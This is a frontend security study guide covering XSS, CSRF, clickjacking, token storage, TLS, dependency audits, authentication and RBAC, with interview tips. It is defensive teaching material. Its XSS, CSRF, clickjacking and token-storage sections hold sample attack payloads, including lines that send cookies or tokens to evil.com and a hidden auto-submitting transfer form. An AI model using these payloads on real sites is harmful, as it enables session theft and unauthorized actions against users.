# Frontend Security — Comprehensive Coverage

## 1. XSS (Cross-Site Scripting) Prevention

### What is XSS?
XSS is an attack where an attacker injects malicious scripts into web pages viewed by users. When a user visits the page, the script executes in their browser, potentially stealing cookies, session tokens, or performing actions on their behalf.

### Types of XSS

#### 1.1 Reflected XSS
- Attacker injects malicious code into a URL
- Server reflects the code back to the user without sanitization
- User clicks the malicious link
- Script executes in the user's browser

**Example:**
```javascript
// Vulnerable code
function search() {
  const query = new URLSearchParams(window.location.search).get('q');
  document.getElementById('results').innerHTML = `Search results for: ${query}`;
}

// Attack: ?q=<img src=x onerror="alert('XSS')">
// The script tag will execute
```

#### 1.2 Stored XSS (Persistent)
- Attacker injects malicious code into the database (e.g., comments, posts)
- The code is stored and served to ALL users who view that page
- More dangerous than reflected XSS

**Example:**
```javascript
// Vulnerable: Storing user comment without sanitization
function saveComment(userId, commentText) {
  db.save({
    userId,
    comment: commentText  // No sanitization!
  });
}

// Attacker stores: <script>fetch('https://evil.com?cookie=' + document.cookie)</script>
// Every user who views the comment will have their cookies stolen
```

#### 1.3 DOM-based XSS
- Vulnerability exists in client-side JavaScript code
- Code reads from a source (URL, localStorage) and writes to a sink (innerHTML, eval)
- No server interaction

**Example:**
```javascript
// Vulnerable code
function displayUser() {
  const username = document.location.hash.substring(1);
  document.getElementById('welcome').innerHTML = 'Hello ' + username;
}

// Attack: page.html#<img src=x onerror="alert('XSS')">
```

### XSS Prevention Techniques

#### 1.3.1 Input Sanitization
Remove or escape dangerous characters/tags before storing or displaying data.

```javascript
// DOMPurify library (recommended)
import DOMPurify from 'dompurify';

function saveComment(commentText) {
  const cleanComment = DOMPurify.sanitize(commentText);
  db.save({ comment: cleanComment });
}

// Manual HTML escaping
function escapeHTML(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return str.replace(/[&<>"']/g, (char) => map[char]);
}

// Usage
const safeText = escapeHTML('<img src=x onerror="alert()">');
element.textContent = safeText;  // Safe to display
```

#### 1.3.2 Use textContent instead of innerHTML
```javascript
// ❌ Vulnerable
document.getElementById('output').innerHTML = userInput;

// ✅ Safe - treats content as text, not HTML
document.getElementById('output').textContent = userInput;

// ✅ Safe - with proper escaping
element.textContent = userInput;
```

#### 1.3.3 Content Security Policy (CSP)
CSP is a security header that tells the browser which sources of content are allowed.

```html
<!-- Prevent inline scripts and restrict script sources -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.googleapis.com;
  connect-src 'self' https://api.example.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self'
">
```

**CSP Directives Explained:**
- `default-src 'self'` — Only allow resources from same origin
- `script-src 'self'` — Scripts only from same origin (blocks inline scripts)
- `style-src 'unsafe-inline'` — Allow inline CSS (less safe)
- `img-src 'self' data: https:` — Allow images from self, data URIs, and HTTPS
- `connect-src 'self'` — API calls only to same origin
- `object-src 'none'` — Disable plugins like Flash
- `frame-ancestors 'none'` — Prevent framing attacks

**Server-side CSP header:**
```javascript
// Express.js
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; script-src 'self' https://trusted-cdn.com");
  next();
});
```

#### 1.3.4 React/Framework Protections
Most modern frameworks escape content by default.

```jsx
// ✅ Safe - React automatically escapes
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>;
}

// ❌ Dangerous - dangerous prop circumvents escaping
function UnsafeComponent({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ✅ If you must use HTML, sanitize it
import DOMPurify from 'dompurify';

function SafeHtmlComponent({ html }) {
  const sanitized = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

#### 1.3.5 Avoid Dangerous Functions
```javascript
// ❌ NEVER use eval with user input
eval(userInput);  // Extremely dangerous

// ❌ NEVER use Function constructor
new Function(userInput)();

// ❌ NEVER use innerHTML with user input
element.innerHTML = userInput;

// ❌ NEVER use jQuery's html() with user input
$('#element').html(userInput);

// ✅ Use textContent, innerText, or libraries
element.textContent = userInput;
```

#### 1.3.6 Implement Subresource Integrity (SRI)
Ensure external scripts haven't been tampered with.

```html
<!-- Verify script integrity -->
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4KG2jstE"
  crossorigin="anonymous">
</script>

<!-- Generate integrity hash with: openssl dgst -sha384 -binary library.js | openssl base64 -->
```

---

## 2. CSRF (Cross-Site Request Forgery) Protection

### What is CSRF?
CSRF is an attack where an attacker tricks a user into making unwanted requests to a website where the user is authenticated. The attacker exploits the user's existing session.

### How CSRF Attacks Work

**Attack Scenario:**
1. User logs into their bank website (bank.com)
2. User visits a malicious website (evil.com) without logging out
3. evil.com contains code that makes a request to bank.com
4. Because the user's session is still active, the bank processes the request
5. Attacker transfers money, changes password, etc.

**Vulnerable code example:**
```html
<!-- On evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- Or -->
<form action="https://bank.com/transfer" method="POST" style="display:none;">
  <input name="to" value="attacker" />
  <input name="amount" value="1000" />
  <input type="submit" />
</form>
<script>
  document.querySelector('form').submit();
</script>
```

### CSRF Prevention Techniques

#### 2.1 CSRF Token (Synchronizer Token Pattern)
Most common and effective approach.

**How it works:**
1. Server generates a unique token for each user session
2. Server includes token in every form/request
3. User submits the form with the token
4. Server validates the token matches the session
5. Attacker cannot forge the token (it's unpredictable)

**Implementation:**

```javascript
// Backend (Express.js example)
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const session = require('express-session');

app.use(cookieParser());
app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: true
}));

// Middleware to generate CSRF token
const csrfProtection = csrf({ cookie: false });  // Store in session, not cookie

app.get('/form', csrfProtection, (req, res) => {
  res.send(`
    <form action="/submit" method="POST">
      <input type="hidden" name="_csrf" value="${req.csrfToken()}">
      <input type="text" name="message" />
      <button type="submit">Submit</button>
    </form>
  `);
});

app.post('/submit', csrfProtection, (req, res) => {
  // Token is automatically validated by middleware
  res.send('Success');
});
```

```jsx
// Frontend (React example)
import { useEffect, useState } from 'react';

function SafeForm() {
  const [csrfToken, setCsrfToken] = useState('');

  useEffect(() => {
    // Get CSRF token from server
    fetch('/csrf-token')
      .then(res => res.json())
      .then(data => setCsrfToken(data.token));
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    const formData = new FormData(e.target);
    formData.append('_csrf', csrfToken);

    const response = await fetch('/submit', {
      method: 'POST',
      body: formData,
      headers: {
        'X-CSRF-Token': csrfToken
      }
    });
    
    console.log(await response.json());
  };

  return (
    <form onSubmit={handleSubmit}>
      <input type="hidden" name="_csrf" value={csrfToken} />
      <input type="text" name="message" required />
      <button type="submit">Submit</button>
    </form>
  );
}
```

#### 2.2 SameSite Cookie Attribute
Restricts when cookies are sent with cross-site requests.

```javascript
// Backend - Set SameSite attribute
app.use(session({
  secret: 'your-secret-key',
  cookie: {
    httpOnly: true,      // Prevent JavaScript access
    secure: true,        // HTTPS only
    sameSite: 'Strict'   // Don't send cookie in cross-site requests
    // Options: 'Strict' | 'Lax' | 'None'
  }
}));
```

**SameSite Values:**
- `Strict` — Cookie not sent for ANY cross-site requests (most secure, but breaks some functionality)
- `Lax` — Cookie sent for top-level navigations (link clicks), but not for forms/AJAX (default in most browsers)
- `None` — Cookie sent for all requests (requires `Secure` flag and HTTPS)

#### 2.3 Double Submit Cookie Pattern
Alternative if tokens can't be used.

```javascript
// Backend
app.get('/api/data', (req, res) => {
  // Generate random token and send it in cookie AND response body
  const token = generateRandomToken();
  res.cookie('_csrf', token, { httpOnly: false });
  res.json({ csrfToken: token });
});

app.post('/api/submit', (req, res) => {
  const tokenFromCookie = req.cookies._csrf;
  const tokenFromBody = req.body._csrf;
  
  // Tokens must match
  if (tokenFromCookie === tokenFromBody) {
    // Process request
    res.json({ success: true });
  } else {
    res.status(403).json({ error: 'CSRF validation failed' });
  }
});
```

```javascript
// Frontend
async function submitForm(data) {
  // Get CSRF token from cookie
  const csrfToken = getCookie('_csrf');
  
  const response = await fetch('/api/submit', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken  // Send in header
    },
    body: JSON.stringify({
      ...data,
      _csrf: csrfToken  // Also send in body
    })
  });
  
  return response.json();
}
```

#### 2.4 Custom Request Headers
CSRF attacks can't set custom headers due to CORS.

```javascript
// Backend - Expect custom header
app.post('/api/submit', (req, res) => {
  const token = req.get('X-Custom-Header');
  
  if (!token) {
    return res.status(403).json({ error: 'Missing CSRF token' });
  }
  
  // Verify token...
  res.json({ success: true });
});
```

```javascript
// Frontend - Always include custom header
const options = {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest'  // Custom header
  },
  body: JSON.stringify(data)
};

fetch('/api/submit', options);
```

---

## 3. Quick Comparison: XSS vs CSRF

| Aspect | XSS | CSRF |
|--------|-----|------|
| **Attack Type** | Injects malicious script | Tricks user into making unwanted request |
| **Execution Location** | User's browser | User's account/server |
| **Requires Authentication** | No | Yes |
| **Attacker Can** | Steal cookies, hijack session, deface page | Transfer money, change password, post content |
| **Prevention** | Input sanitization, CSP, escape output | CSRF tokens, SameSite cookies, custom headers |
| **Detection** | Content Security Policy violations | Token mismatch |

---

## 4. Implementation Checklist

### For Your React App:
```javascript
// 1. Install DOMPurify for XSS protection
// npm install dompurify

import DOMPurify from 'dompurify';

// 2. Create utility function for safe HTML
export function sanitizeHTML(html) {
  return DOMPurify.sanitize(html);
}

// 3. Always use textContent instead of innerHTML
export function SafeDisplay({ content }) {
  return <div>{content}</div>;  // React auto-escapes
}

// 4. For forms, implement CSRF protection
export function ProtectedForm() {
  const [csrfToken, setCsrfToken] = useState('');

  useEffect(() => {
    fetch('/api/csrf-token')
      .then(r => r.json())
      .then(data => setCsrfToken(data.token));
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    await fetch('/api/submit', {
      method: 'POST',
      headers: {
        'X-CSRF-Token': csrfToken,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ /* data */ })
    });
  };

  return <form onSubmit={handleSubmit}>...</form>;
}

// 5. Set CSP header in your server
// Response header: Content-Security-Policy: default-src 'self'; script-src 'self'

// 6. Use httpOnly cookies for sessions
// cookie: { httpOnly: true, secure: true, sameSite: 'Strict' }
```

---

## 5. Real-World Examples

### ✅ Secure Comment System
```javascript
function CommentList({ comments }) {
  return (
    <div>
      {comments.map(comment => (
        <div key={comment.id}>
          {/* React automatically escapes this */}
          <p>{comment.text}</p>
          <p>— {comment.author}</p>
        </div>
      ))}
    </div>
  );
}

async function postComment(text) {
  // Sanitize before sending to server
  const sanitized = DOMPurify.sanitize(text);
  
  const response = await fetch('/api/comments', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({ text: sanitized })
  });
  
  return response.json();
}
```

### ✅ Secure Profile Update
```javascript
async function updateProfile(profile) {
  // Sanitize all user inputs
  const sanitized = {
    name: DOMPurify.sanitize(profile.name),
    bio: DOMPurify.sanitize(profile.bio),
    avatar: validateImageURL(profile.avatar)  // Whitelist URLs only
  };

  const response = await fetch('/api/profile', {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify(sanitized)
  });

  return response.json();
}

function validateImageURL(url) {
  try {
    const urlObj = new URL(url);
    // Only allow HTTPS and trusted domains
    if (urlObj.protocol !== 'https:') return '';
    if (!['cdn.example.com', 'avatars.example.com'].includes(urlObj.hostname)) return '';
    return url;
  } catch {
    return '';
  }
}
```

---

## Interview Tips

**When asked about XSS:**
- Explain the three types: Reflected, Stored, DOM-based
- Mention CSP as primary defense
- Show knowledge of input sanitization + output encoding
- Discuss DOMPurify for React apps

**When asked about CSRF:**
- Explain the attack: user tricks, authenticated session
- Mention CSRF tokens as standard solution
- Discuss SameSite cookie attribute (modern approach)
- Mention custom headers (can't be set by cross-site code)

**When asked "What's the difference?"**
- XSS = injecting malicious code
- CSRF = making unauthorized requests using a legitimate session
- XSS can execute anywhere; CSRF requires authenticated session

---

## 6. Clickjacking Prevention

### What is Clickjacking?
Clickjacking (UI Redressing) is an attack where an attacker tricks users into clicking on hidden or disguised elements. The attacker overlays invisible iframe over a legitimate website to hijack user interactions.

**Attack Example:**
```html
<!-- Attacker's page -->
<iframe src="https://bank.com" style="opacity: 0; position: absolute;"></iframe>
<button style="position: absolute; top: 100px; left: 100px;">
  Click here to win a prize!
</button>
<!-- User thinks they're clicking the button, but actually clicks the hidden bank.com transfer button -->
```

### Prevention: X-Frame-Options Header

```javascript
// Express.js - Prevent framing
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');  // Most restrictive
  next();
});

// Options:
// DENY           — Page cannot be displayed in a frame
// SAMEORIGIN     — Page can only be framed by pages on same origin
// ALLOW-FROM url — Page can be framed by specific URL (deprecated, use CSP instead)
```

### Prevention: Content Security Policy

```html
<!-- Modern approach: use CSP frame-ancestors directive -->
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'">
```

```javascript
// Server-side CSP header
res.setHeader('Content-Security-Policy', "frame-ancestors 'self'");
// 'none'     — Cannot be framed
// 'self'     — Can only be framed by same origin
// 'https://trusted.com' — Can be framed by specific domain
```

### Best Practice
```javascript
// Use both X-Frame-Options and CSP for maximum compatibility
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('Content-Security-Policy', "frame-ancestors 'self'");
  next();
});
```

---

## 7. Token Storage Trade-offs

### localStorage vs httpOnly Cookies vs sessionStorage

| Factor | localStorage | httpOnly Cookie | sessionStorage |
|--------|--------------|-----------------|---|
| **Accessibility** | JavaScript can access | JavaScript CANNOT access | JavaScript can access |
| **Persistence** | Survives browser close | Survives browser close | Cleared on browser close |
| **XSS Vulnerable** | ✅ Yes | ❌ No (protected) | ✅ Yes |
| **CSRF Vulnerable** | ❌ No (not sent with requests) | ✅ Yes (auto-sent) | ❌ No |
| **Use Case** | Non-sensitive data | Secure token storage | Temporary data |

### ❌ localStorage for Tokens (VULNERABLE)
```javascript
// Vulnerable to XSS!
localStorage.setItem('authToken', token);

// Attacker's XSS script can steal it:
// fetch('https://evil.com?token=' + localStorage.getItem('authToken'))
```

### ✅ httpOnly Cookies (SECURE)
```javascript
// Backend - Set httpOnly cookie
res.cookie('authToken', token, {
  httpOnly: true,      // JavaScript cannot access
  secure: true,        // HTTPS only
  sameSite: 'Strict',  // CSRF protection
  maxAge: 3600000      // 1 hour
});

// Frontend - Token is auto-sent with requests, XSS cannot steal it
fetch('/api/protected')  // Cookie automatically included
  .then(res => res.json());
```

### Hybrid Approach (BALANCED)
```javascript
// Store public info in localStorage, sensitive token in httpOnly cookie
localStorage.setItem('userId', user.id);
localStorage.setItem('userName', user.name);
// Token stored in httpOnly cookie by backend

// When XSS happens:
// - Attacker can only get public data (userId, userName)
// - Sensitive token in httpOnly cookie is protected
// - API calls fail without valid token
```

### Session Storage (TEMPORARY)
```javascript
// Cleared when tab/window closes (no persistence)
sessionStorage.setItem('tempData', data);

// Use for:
// - Form data in multi-step wizard
// - UI state for current session
// - NOT for authentication tokens
```

### Best Practice
```javascript
// Backend
app.post('/login', (req, res) => {
  const user = authenticateUser(req.body);
  
  // Set httpOnly cookie for sensitive token
  res.cookie('accessToken', generateToken(user), {
    httpOnly: true,
    secure: true,
    sameSite: 'Strict',
    maxAge: 3600000
  });
  
  // Send non-sensitive user data
  res.json({
    userId: user.id,
    userName: user.name,
    role: user.role
  });
});

// Frontend - No token management needed, browser handles it
async function getProtectedData() {
  const res = await fetch('/api/protected');
  return res.json();
  // Token automatically sent in request due to httpOnly cookie
}
```

---

## 8. HTTPS & TLS (Transport Layer Security)

### Why HTTPS Matters
- Encrypts data in transit (prevents eavesdropping)
- Verifies server identity (prevents man-in-the-middle attacks)
- Ensures data integrity (detects tampering)

### TLS Handshake Process
```
Client                                    Server
  |                                         |
  |------------ ClientHello ------------->|
  | (supports ciphers, TLS version)        |
  |                                         |
  |<---------- ServerHello --------------|
  | (chooses cipher, sends certificate)    |
  |                                         |
  |<--- Certificate + ServerKeyExchange -|
  |                                         |
  |------------ ClientKeyExchange ------->|
  | (send encrypted pre-master secret)     |
  |                                         |
  |------------ ChangeCipherSpec -------->|
  | (switch to encrypted communication)    |
  |                                         |
  |------------ Finished ---------->|
  |                                         |
  |<---------- ChangeCipherSpec ---------|
  |<---------- Finished ----------|
  |                                         |
  | === Encrypted connection established ===|
```

### Cipher Suites
A cipher suite is a combination of algorithms used for encryption.

```
Example: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
  - TLS_ECDHE     = Key exchange (Elliptic Curve Diffie-Hellman Ephemeral)
  - RSA           = Authentication
  - AES_256_GCM   = Symmetric encryption (256-bit AES in Galois Counter Mode)
  - SHA384        = Hash function
```

### Configuring HTTPS (Node.js/Express)
```javascript
const fs = require('fs');
const https = require('https');
const express = require('express');

const app = express();

const options = {
  key: fs.readFileSync('path/to/private.key'),
  cert: fs.readFileSync('path/to/certificate.crt')
};

https.createServer(options, app).listen(443, () => {
  console.log('HTTPS Server running on port 443');
});
```

### Security Headers for HTTPS
```javascript
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  // Forces browser to always use HTTPS for next year
  
  res.setHeader('Expect-CT', 'max-age=86400, enforce');
  // Ensures valid SSL certificate
  
  next();
});
```

---

## 9. Dependency Vulnerabilities

### Why Dependencies Matter
- Third-party packages can have security vulnerabilities
- Outdated packages are prime targets for attacks
- Supply chain attacks are increasing

### Identifying Vulnerabilities

```bash
# Check for vulnerabilities
npm audit

# Show only high-severity issues
npm audit --audit-level=high

# Generate detailed report
npm audit --json

# Fix vulnerabilities automatically
npm audit fix

# Fix only high-severity
npm audit fix --force
```

### Understanding npm audit Output
```
┌───────────────┬──────────────────┬──────────┬───────────────┐
│ Package       │ Vulnerability    │ Severity │ Advisories    │
├───────────────┼──────────────────┼──────────┼───────────────┤
│ lodash        │ Prototype        │ High     │ GHSA-35jh-r3h4 │
│               │ pollution        │          │                │
└───────────────┴──────────────────┴──────────┴───────────────┘

Action: npm install lodash@4.17.21
```

### Best Practices

```javascript
// 1. Regular audits in CI/CD pipeline
// package.json
{
  "scripts": {
    "audit": "npm audit --audit-level=high",
    "test": "npm run audit && jest"
  }
}

// 2. Use lock files (package-lock.json)
// Ensures reproducible installs

// 3. Automate dependency updates
// Use Dependabot, Renovate, or Snyk

// 4. Keep dependencies updated
npm update

// 5. Check before installing
npm info package-name version

// 6. Monitor for vulnerabilities
// npm install -g snyk
// snyk test
// snyk monitor
```

### Snyk Integration
```bash
# Install Snyk CLI
npm install -g snyk

# Test project
snyk test

# Continuous monitoring
snyk monitor

# Fix vulnerabilities
snyk fix
```

---

## 10. Authentication Patterns

### JWT (JSON Web Token)

**Structure:** `header.payload.signature`

```javascript
// JWT Example
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "sub": "user123",
  "name": "Vidit",
  "iat": 1516239022,
  "exp": 1516242622
}

// Signature
HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```

**Implementation:**

```javascript
const jwt = require('jsonwebtoken');

// Create token
app.post('/login', (req, res) => {
  const user = authenticateUser(req.body);
  
  const token = jwt.sign(
    { userId: user.id, email: user.email },
    'your-secret-key',
    { expiresIn: '1h' }
  );
  
  res.json({ token });
});

// Verify token
function verifyToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'No token' });
  }
  
  try {
    const decoded = jwt.verify(token, 'your-secret-key');
    req.userId = decoded.userId;
    next();
  } catch (error) {
    res.status(403).json({ error: 'Invalid token' });
  }
}

app.get('/protected', verifyToken, (req, res) => {
  res.json({ data: 'sensitive' });
});
```

### OAuth 2.0

OAuth allows users to authenticate using third-party providers (Google, GitHub, etc.).

```javascript
// Using passport.js with Google OAuth
const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;

passport.use(new GoogleStrategy({
  clientID: process.env.GOOGLE_CLIENT_ID,
  clientSecret: process.env.GOOGLE_CLIENT_SECRET,
  callbackURL: '/auth/google/callback'
}, (accessToken, refreshToken, profile, done) => {
  // Find or create user
  User.findOrCreate({ googleId: profile.id }, (err, user) => {
    return done(err, user);
  });
}));

app.get('/auth/google',
  passport.authenticate('google', { scope: ['profile', 'email'] })
);

app.get('/auth/google/callback',
  passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => {
    // Authentication successful
    res.redirect('/dashboard');
  }
);
```

### Session-Based Authentication

```javascript
const session = require('express-session');

app.use(session({
  secret: 'keyboard cat',
  resave: false,
  saveUninitialized: true,
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'Strict',
    maxAge: 3600000
  }
}));

app.post('/login', (req, res) => {
  const user = authenticateUser(req.body);
  
  if (user) {
    req.session.userId = user.id;
    req.session.user = user;
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.get('/profile', (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  res.json({ user: req.session.user });
});

app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) return res.status(500).json({ error: 'Logout failed' });
    res.json({ success: true });
  });
});
```

---

## 11. Authorization & RBAC (Role-Based Access Control)

### Basic RBAC Implementation

```javascript
// Define roles and permissions
const roles = {
  admin: ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write', 'delete'],
  viewer: ['read']
};

// Middleware to check permission
function authorize(permission) {
  return (req, res, next) => {
    const userRole = req.session.user.role;
    const userPermissions = roles[userRole] || [];
    
    if (userPermissions.includes(permission)) {
      next();
    } else {
      res.status(403).json({ error: 'Forbidden' });
    }
  };
}

// Usage
app.delete('/api/article/:id', authorize('delete'), (req, res) => {
  // Delete article
  res.json({ success: true });
});
```

### Advanced RBAC with Database

```javascript
// Users table
// id | email | role_id

// Roles table
// id | name (admin, editor, viewer)

// Permissions table
// id | name (create_post, edit_post, delete_post)

// Role_Permissions table
// role_id | permission_id

async function getUserPermissions(userId) {
  const result = await db.query(`
    SELECT DISTINCT p.name
    FROM users u
    JOIN roles r ON u.role_id = r.id
    JOIN role_permissions rp ON r.id = rp.role_id
    JOIN permissions p ON rp.permission_id = p.id
    WHERE u.id = $1
  `, [userId]);
  
  return result.rows.map(row => row.name);
}

function authorize(requiredPermission) {
  return async (req, res, next) => {
    const permissions = await getUserPermissions(req.session.userId);
    
    if (permissions.includes(requiredPermission)) {
      next();
    } else {
      res.status(403).json({ error: 'Insufficient permissions' });
    }
  };
}
```

### Frontend RBAC

```jsx
// React component with role-based UI
function ArticleActions({ article, userRole }) {
  const roles = {
    admin: ['edit', 'delete', 'publish'],
    editor: ['edit', 'delete'],
    viewer: []
  };
  
  const allowedActions = roles[userRole] || [];
  
  return (
    <div>
      {allowedActions.includes('edit') && (
        <button onClick={() => editArticle(article.id)}>Edit</button>
      )}
      
      {allowedActions.includes('delete') && (
        <button onClick={() => deleteArticle(article.id)}>Delete</button>
      )}
      
      {allowedActions.includes('publish') && (
        <button onClick={() => publishArticle(article.id)}>Publish</button>
      )}
    </div>
  );
}
```

### Attribute-Based Access Control (ABAC)

More flexible than RBAC - decisions based on attributes.

```javascript
// Attribute-based example
function canPerformAction(user, resource, action) {
  // Admin can do anything
  if (user.role === 'admin') return true;
  
  // User can edit their own resources
  if (action === 'edit' && resource.userId === user.id) return true;
  
  // Editor can delete posts (not comments)
  if (action === 'delete' && user.role === 'editor' && resource.type === 'post') {
    return true;
  }
  
  return false;
}

// Usage
app.put('/api/post/:id', (req, res) => {
  const post = db.getPost(req.params.id);
  
  if (!canPerformAction(req.session.user, post, 'edit')) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  // Update post
  res.json({ success: true });
});
```

---

## Security Checklist

- ✅ Sanitize all user inputs (use DOMPurify)
- ✅ Use httpOnly, Secure, SameSite cookies for tokens
- ✅ Implement CSRF tokens or SameSite cookies
- ✅ Set Content Security Policy headers
- ✅ Set X-Frame-Options to prevent clickjacking
- ✅ Use HTTPS everywhere with HSTS header
- ✅ Regular `npm audit` and `npm audit fix`
- ✅ Implement proper authentication (JWT, OAuth, or sessions)
- ✅ Use authorization middleware for protected routes
- ✅ Never log sensitive data (passwords, tokens)
- ✅ Use environment variables for secrets
- ✅ Implement rate limiting on API endpoints
- ✅ Validate server-side (never trust client validation alone)
